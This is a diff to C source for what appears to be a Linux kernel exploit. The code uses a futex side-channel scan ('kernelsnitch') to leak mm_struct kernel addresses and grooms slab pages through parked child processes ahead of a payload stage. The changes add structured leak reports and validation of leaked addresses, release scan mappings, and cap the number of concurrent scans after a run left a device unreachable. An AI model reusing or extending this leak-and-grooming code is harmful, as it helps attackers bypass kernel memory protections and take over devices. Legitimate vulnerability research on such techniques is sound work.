@@ -63,6 +63,9 @@ static pid_t child_leak;
  * serialized on the freeing CPU: one at a time, ~8-10 minutes each. */
 static int ks_id_dumps;
 static int dump_pipe_count;
+/* The report's terminal-state value must track the scan's own enum. */
+_Static_assert(KP_DUMP_STATE_MM_FOUND == KERNELSNITCH_MM_FOUND,
+               "KP_DUMP_STATE_MM_FOUND must mirror kernelsnitch_state");
 static int dump_fd[64][4]; /* start[0], start[1], report[0], report[1] */
 static uintptr_t dump_addr[64];
 static uintptr_t cached_leaked_mm;
@@ -1437,15 +1440,34 @@ static pid_t clone_dump_slot(size_t slot) {
         mm_plausible(ks->mm_struct)) {
       mm = (uintptr_t)ks->mm_struct;
     }
+    /* One report carries the address and the evidence behind it: the
+     * collision count this scan accepted and the state it ended in.  The
+     * collision set lives in this mm, so the parent cannot re-check it; it
+     * validates this report instead. */
     {
-      char line[32];
-      int n = snprintf(line, sizeof(line), "%016zx\n", (size_t)mm);
-      if (n > 0) {
+      char line[64];
+      int n = snprintf(line, sizeof(line), "mm=%016zx accepted=%zu state=%d\n",
+                       (size_t)mm, (size_t)ks->accepted_count, (int)ks->state);
+      if (n > 0 && (size_t)n < sizeof(line)) {
         ssize_t w = write(dump_fd[i][3], line, (size_t)n);
         (void)w;
       }
     }
     close(dump_fd[i][3]);
+    /* Release the scan's mappings before parking.  The child must stay alive
+     * because its mm is the slab object, but not for the futex window it
+     * scanned: that is the resource the paused children were holding.
+     * kernelsnitch_cleanup() asserts a terminal state, so anything else keeps
+     * its mappings and says so instead of tripping the assert. */
+    if (ks != NULL && (ks->state == KERNELSNITCH_MM_FOUND ||
+                       ks->state == KERNELSNITCH_MM_NOT_FOUND)) {
+      (void)kernelsnitch_cleanup(ks);
+      ks = NULL;
+      pr_info("KS_ID_DUMP_CLEANUP slot=%zu result=released\n", slot);
+    } else if (ks != NULL) {
+      pr_warning("KS_ID_DUMP_CLEANUP slot=%zu result=skipped state=%d "
+                 "reason=not-terminal\n", slot, (int)ks->state);
+    }
     pin_to_core(CORE);
     for (;;) {
       pause();
@@ -1463,6 +1485,7 @@ static pid_t clone_dump_slot(size_t slot) {
  * filled with another slot's page. */
 static void collect_dump_addresses(struct kp_geometry *geo) {
   double t0 = ks_now_ms();
+  int reported = 0;
   for (int i = 0; i < dump_pipe_count; i++) {
     char go = 1;
     if (dump_fd[i][1] >= 0) {
@@ -1473,7 +1496,6 @@ static void collect_dump_addresses(struct kp_geometry *geo) {
     }
     char line[64];
     size_t used = 0;
-    int got = 0;
     for (int waited = 0; waited < 900; waited++) {
       struct pollfd p;
       p.fd = dump_fd[i][2];
@@ -1486,7 +1508,6 @@ static void collect_dump_addresses(struct kp_geometry *geo) {
         if (n > 0) {
           used += (size_t)n;
           if (memchr(line, '\n', used) != NULL) {
-            got = 1;
             break;
           }
         } else if (n == 0) {
@@ -1499,20 +1520,41 @@ static void collect_dump_addresses(struct kp_geometry *geo) {
     close(dump_fd[i][2]);
     dump_fd[i][2] = -1;
     line[used] = 0;
+    /* The report is the unit: kp_dump_admit() refuses a child that did not
+     * report, a truncated line, a malformed line, a scan that ended without an
+     * mm, a zero address, a collision set under the gate's bar, a duplicate
+     * address and an address the geometry cannot resolve.  A refused report
+     * never becomes a page: only the geometry failure keeps its address, as a
+     * row excluded from every page conclusion. */
     uintptr_t mm = 0;
-    if (got) {
-      mm = (uintptr_t)strtoull(line, NULL, 16);
-    }
-    pr_info("KS_ID_DUMP slot=%d addr=%016zx src=%s waited_ms=%.0f\n", i + 1,
-            (size_t)mm, got ? "measured(scan-in-slot-child)" : "unavailable",
-            ks_now_ms() - t0);
-    if (mm != 0) {
+    const char *why = NULL;
+    int admitted = kp_dump_admit(geo, (size_t)i + 1, line, used, &mm, &why);
+    if (admitted) {
+      reported++;
       dump_addr[i] = mm;
-      (void)kp_identity_object(geo, (size_t)i + 1, mm);
+      pr_info("KS_ID_DUMP slot=%d addr=%016zx src=measured(scan-in-slot-child) "
+              "verdict=accepted waited_ms=%.0f\n",
+              i + 1, (size_t)mm, ks_now_ms() - t0);
+    } else {
+      pr_warning("KS_ID_DUMP slot=%d addr=unavailable(reason=%s) "
+                 "verdict=rejected waited_ms=%.0f\n",
+                 i + 1, why != NULL ? why : "unknown", ks_now_ms() - t0);
     }
   }
-  pr_info("KS_ID_DUMP_DONE slots=%d total_ms=%.0f\n", dump_pipe_count,
-          ks_now_ms() - t0);
+  {
+    int open = 0;
+    for (int i = 0; i < dump_pipe_count; i++) {
+      for (int j = 0; j < 4; j++) {
+        if (dump_fd[i][j] >= 0) {
+          open++;
+        }
+      }
+    }
+    pr_info("KS_ID_DUMP_DONE slots=%d reported=%d rejected=%d open_pipes=%d "
+            "total_ms=%.0f\n",
+            dump_pipe_count, reported, dump_pipe_count - reported, open,
+            ks_now_ms() - t0);
+  }
 }
 
 static void wait_leak_child(pid_t child) {
@@ -2406,8 +2448,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     if (want > (int)mm_objs_per_slab - 1) {
       want = (int)mm_objs_per_slab - 1;
     }
-    if (want > 64) {
-      want = 64;
+    if (want > 2) {
+      /* More than two paused scans is unvalidated: the 18:46 two-slot run
+       * left the device unreachable and the cause is not established. */
+      pr_warning("KS_ID_DUMPS cap=2 requested=%d reason=collector-unvalidated\n",
+                 want);
+      want = 2;
     }
     ks_id_dumps = want;
   }
